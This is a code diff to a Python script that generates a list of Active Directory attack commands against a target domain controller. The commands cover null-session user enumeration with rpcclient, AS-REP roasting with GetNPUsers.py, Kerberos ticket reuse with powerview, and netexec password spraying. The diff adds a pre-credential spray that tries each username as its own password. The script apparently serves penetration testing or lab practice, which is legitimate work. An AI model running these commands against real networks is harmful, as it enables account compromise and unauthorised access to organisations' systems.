@@ -51,6 +51,10 @@ def create_ad_enumeration_file(target_ip, hostname, domain, local_ip, user, pass
             f.write(f"rpcclient -U \"\" -N {target_ip}\n")
         f.write("cat dirty.txt | cut -b 7-999 | rev | cut -b 14-99 | rev > users.txt\n\n")
 
+        # Pre-creds password spray with files
+        if not has_creds:
+            f.write(f"netexec smb {domain} -u users.txt -p users.txt --continue-on-success\n\n")
+
         # AS Rep Roasting
         f.write("# AS Rep Roasting\n")
         f.write(f"for user in $(cat users.txt); do GetNPUsers.py -no-pass -dc-ip {target_ip} {domain}/${{user}} | grep -v Impacket; done\n\n")
@@ -89,9 +93,9 @@ def create_ad_enumeration_file(target_ip, hostname, domain, local_ip, user, pass
             f.write(f"export KRB5CCNAME=./{user}.ccache\n")
             f.write(f"powerview {domain}/{user}@{target_ip} -k --no-pass --dc-ip {target_ip}\n\n")
 
-        # Password spraying
+        # Password spraying after creds known
         if has_creds:
-            f.write("# Password Spray\n")
+            f.write("# Password Spray with known password\n")
             f.write(f"netexec smb {target_ip} -u users.txt -p '{password}' --continue-on-success\n\n")
 
         # RemotePotato check
